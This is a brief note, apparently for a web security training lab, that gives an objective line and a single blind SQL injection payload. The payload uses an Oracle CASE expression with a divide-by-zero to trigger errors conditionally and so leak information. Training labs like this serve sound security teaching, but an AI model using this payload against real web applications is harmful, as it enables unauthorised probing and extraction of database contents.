# Lab: Blind SQL injection with conditional errors

## Objective
Perform the attack to solve Blind SQL injection with conditional errors.

## Payload
```text
'+AND+(SELECT+CASE+WHEN+(1=1)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual)='
```
